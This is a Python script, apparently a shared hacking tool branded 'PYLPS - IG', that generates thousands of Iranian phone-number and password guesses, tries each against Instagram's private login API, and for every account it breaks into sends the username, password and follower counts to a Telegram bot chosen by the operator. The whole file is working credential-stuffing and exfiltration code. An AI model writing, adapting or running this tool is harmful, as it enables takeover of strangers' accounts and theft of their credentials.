
try:
	import os
	import re
	import sys
	import time
	import json
	import random
	import requests
	import hashlib
	import pyfiglet
	import rich
	from time import sleep
	from rich.markdown import *
	from rich.console import *
except ImportError as e:
	pypls = f"# • The library will be installed ({e}) •"
	tech = rich.markdown.Markdown(pypls, style="green")
	rich.console.Console().print(tech)
	print("")
	os.system(f"pip install {e}")
	time.sleep(1)
	os.system("clear")
	pass


A = "\033[1;91m"
B = "\033[1;90m"
C = "\033[1;97m"
E = "\033[1;92m"
H = "\033[1;93m"
K = "\033[1;94m"
L = "\033[1;95m"


	
	
	

def combo():
	files = ('.txt')
	os.system(f'rm -rf {files}')
	os.system('clear')
	print(pyfiglet.figlet_format(" PYLPS - IG "))
	print ('')
	for i in range(2500):
		an = random.randint(1000000, 9999999)
		ss = ('+98912'+str(an)+':0912'+str(an))
		with open('.txt', 'a') as sa:
			sa.write(str(ss)+'\n')
			
			
			
def infos(userid,sessionid):
	headers = {
    "accept": "application/json, text/plain, */*",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7",
    "cookie": "ig_did=57C594DF-134B-4172-BCF1-C32A7A21989B; mid=X_sqxgALAAE7joUQdF9J2KQUb0bw; ig_nrcb=1; shbid=2205; shbts=1614954604.1671221; fbm_124024574287414=base_domain=.instagram.com; csrftoken=hE6dtVq6z7Zozo4yfyVPOpTJNEktuPky; rur=FRC; ds_user_id=46430696274; sessionid=" + sessionid + "",
    "sec-ch-ua": '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
	"sec-ch-ua-mobile": "?0",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "none",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)"}
	response = requests.Session().get(url= "https://i.instagram.com/api/v1/users/"+str(userid)+"/info/", data=False, headers=headers).json()
	username = str(response['user']['username'])
	followers = str(response['user']['follower_count'])
	following = str(response['user']['following_count'])
	tech = requests.request("GET","https://o7aa.pythonanywhere.com/?id="+str(userid)).json()
	date = tech['data']
	accounts = {"username": username, "followers": followers, "following": following,"date": date}
	return accounts
	
	
def Pypls(username, password):
    url = "https://i.instagram.com/api/v1/accounts/login/"

    def tech(username, password):
        m = hashlib.md5()
        m.update(username.encode() + password.encode())

        seed = m.hexdigest()  
        volatile_seed = "12345"

        m = hashlib.md5()
        m.update(seed.encode('utf-8') + volatile_seed.encode('utf-8'))
        return 'android-' + m.hexdigest()[:16]

    pypls = tech(username, password)

    payload = {
        'username': username,
        'device_id': pypls,
        'password': password,
    }

    headers = {
        'Accept': '*/*',
        'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept-Language': 'en-US',
        'User-Agent': "Instagram 134.0.0.26.121 Android (28/9; 411dpi; 1080x2220; samsung; SM-A650G; SM-A650G; Snapdragon 450; en_US)",
        'referer' : "https://www.instagram.com/accounts/login/"
    }

    response = requests.post(url, headers=headers, data=payload)
    if response.status_code == 200:
        
        if ("logged_in_user") in str(response.text):
            sessionid = str(response.cookies.get_dict()['sessionid'])
            login = json.loads(response.text)
            userid = str(login['logged_in_user']['pk'])
            successful = {
                "status": True,
                "sessionid": str(sessionid),
                "userid":str(userid),
            }
            return successful
            
        elif ("challenge_required") in str(response.text):
            checkpoint = {
                "status": False,
                }
            return checkpoint
            
            
        else:
            error = {
                "status": None,
                }
            return error
        
    
    else:
        error = {
                "status": None,
                }
        return error
        
        
        
    

	
def Tech_Coder():
	os.system('clear')
	print(pyfiglet.figlet_format(" PYLPS - IG "))
	print ('')
	combo()
	tk = input(C + " [" + E + "+" + C + "] " + C + "Token Bot  :" + E)
	id = input(C + " [" + E + "+" + C + "] " + C + "ID Tele :" + E)
	print ('')
	os.system('clear')
	print(pyfiglet.figlet_format(" PYLPS - IG "))
	print ('')
    
    
	file = open(".txt","r")
	good = 0
	band = 0
	error = 0
	while True:
		lista = file.readline().split('\n')[0]
		if lista == '':
			print ("The and")
			break
			
			
		username = lista.split(':')[0]
		password = lista.split(':')[1]
		
		
		Pyplss = Pypls(username, password)
		#print ('')
		#print (Pyplss)
		#print ('')
		if (Pyplss["status"]) == True:
			good+=1
			sessionid = str(Pyplss["sessionid"])
			userid = str(Pyplss["userid"])
			account = infos(userid,sessionid)
			massage=(" • Account Successful  • \n. -- -- -- -- -- -- -- -- -- -- .\n• Username : " +str(account['username'])+" \n• password : " +str(password)+"\n• Followers : " +str(account['followers'])+"\n• Following : " +str(account['following'])+"\n• Data : " +str(account['date'])+"\n. -- -- -- -- -- -- -- -- -- -- .\n •CH : @Pypls")
			requests.request("GET",f"https://api.telegram.org/bot{tk}/sendMessage?chat_id={id}&text={massage}")
			open('successful.txt','a').write(str(username)+':'+str(password)+'\n')
			
		elif (Pyplss["status"]) == False:
			band+=1
			massage=(" • Account checkpoint • \n. -- -- -- -- -- -- -- -- -- -- .\n• Username : " +str(username)+" \n• password : " +str(password)+"\n• Following : " +str(account['following'])+"\n• Data : " +str(account['date'])+"\n. -- -- -- -- -- -- -- -- -- -- .\n •CH : @Pypls")
			requests.request("GET",f"https://api.telegram.org/bot{tk}/sendMessage?chat_id={id}&text={massage}")
			
		else:
			error+=1
			os.system('clear')
			print(pyfiglet.figlet_format(" PYLPS - IG "))
			print ('')
			print(A+"("+E+username+A+")"+H+" : "+A+"("+E+password+A+")")
			print(A+"-----------------------------------")
			print("{}({}-{}){}  Good {} : {}{}".format(A,E,A,E,A,E,str(good)))
			print("{}({}-{}){}  Band {} : {}{}".format(A,K,A,K,A,K,str(band)))
			print("{}({}-{}){}  Error {} : {}{}".format(A,H,A,B,A,H,str(error)))
			print(A+"-----------------------------------")
			print(H+"Channel  "+A+" : "+E+"@Pypls")
			print ('')
			
		
			
		
			
	

		
Tech_Coder()